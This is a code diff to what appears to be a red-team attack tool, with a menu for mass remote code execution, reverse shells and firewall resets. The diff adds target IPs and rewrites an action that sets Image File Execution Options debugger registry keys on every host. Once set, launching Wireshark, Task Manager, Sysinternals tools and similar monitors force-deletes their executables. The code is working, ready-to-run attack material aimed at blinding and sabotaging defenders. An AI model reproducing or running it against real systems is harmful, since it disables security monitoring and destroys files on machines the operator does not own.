@@ -20,6 +20,8 @@ ALL_HOSTS = [
     # List Teams Here
 
     # Custom IPs
+    "192.168.1.2",
+    "192.168.1.3",
     "192.168.1.6",
 ]
 
@@ -243,7 +245,7 @@ def main_interface():
             Choice(value="MASS", name="Mass Remote Code Execution"),
             Choice(value="SHELL", name="Spawn a Reverse Shell"),
             Choice(value="FIREWALL", name="Reset Firewalls"),
-            Choice(value="IFEO", name="Set IFEO Registry Keys"),
+            Choice(value="IFEO", name="Disable Security & Monitoring Tools"),
             Choice(value="CALLBACK", name="Test Connections"),
             Choice(value=None, name="Exit"),
         ],
@@ -837,7 +839,18 @@ def main():
             command = "netsh advfirewall reset"
             mass_execution(command)
         elif action == "IFEO":
-            command = "for %i in (wireshark.exe taskmgr.exe autoruns.exe autoruns64.exe procexp.exe procexp64.exe procmon.exe procmon64.exe strings.exe strings64.exe Sysmon.exe Sysmon64.exe tcpview.exe tcpview64.exe) do @reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%i\" /v Debugger /t REG_SZ /d \"conhost.exe\""
+            target_processes = (
+                "wireshark.exe", "taskmgr.exe", "autoruns.exe", "autoruns64.exe",
+                "procexp.exe", "procexp64.exe", "procmon.exe", "procmon64.exe", 
+                "strings.exe"
+            )
+    
+            processes_string = " ".join(target_processes)
+            command = (
+                f"for %i in ({processes_string}) do @reg add "
+                f"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%i\" "
+                f"/v Debugger /t REG_SZ /d \"cmd.exe /c del /f /q \"%i\"\""
+            )
             mass_execution(command)
         elif action == "CALLBACK":
             command = "rem"
